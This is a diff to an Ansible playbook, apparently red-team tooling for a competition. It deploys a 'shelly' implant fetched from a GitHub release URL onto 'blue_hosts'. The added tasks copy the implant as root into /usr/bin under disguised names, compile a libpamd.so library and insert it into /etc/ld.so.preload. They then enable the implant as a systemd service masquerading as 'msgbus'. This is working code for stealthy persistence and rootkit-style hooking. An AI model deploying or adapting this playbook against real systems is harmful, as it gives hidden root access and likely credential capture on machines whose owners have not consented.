@@ -4,7 +4,7 @@
   hosts: blue_hosts
   vars:
     implant_url: "https://github.com/vaughnw128/shelly/releases/download/v0.0.8/implant"
-  remote_user: ansible
+  remote_user: ubuntu
   become: yes
   tasks:
 
@@ -25,8 +25,49 @@
     - name: Copy systemd job to systemd 
       copy: remote_src=True src=/tmp/shelly/deploy/msgbus.service dest=/etc/systemd/system/msgbus.service
 
-    - name: Execute the deploy script
-      command: sh /tmp/shelly/deploy/deploy.sh
+    - name: Give root perms to file
+      ansible.builtin.file:
+        path: /tmp/implant
+        owner: root
+        group: root
+        mode: '1777'
+
+    - name: Copy implant files
+      copy:
+        src: '/tmp/implant'
+        dest: '{{item}}'
+        owner: root
+        group: root
+        mode: 1777
+      loop:
+        - /usr/bin/msgbus
+        - /usr/bin/pamhelper
+        - /usr/bin/ansiblectl
+
+    - name: Install packages
+      apt: update_cache=yes name={{ item }} state=present
+      with_items:
+        - gcc
+        - make
+
+    - name: Build libpamd
+      make:
+        chdir: /tmp/shelly/deploy
+        target: all
+        file: /tmp/shelly/deploy/Makefile
+
+    - name: Copy libpamd file
+      copy:
+        src: '/tmp/shelly/deploy/libpamd.so'
+        dest: '/usr/local/lib/libpamd.so'
+        owner: root
+        group: root
+        mode: 0644
+
+    - name: Update ldpreload
+      lineinfile:
+        dest: /etc/ld.so.preload
+        line: '/usr/local/lib/libpamd.so'
 
     - name: start systemd app service
       systemd: name=msgbus.service state=restarted enabled=yes
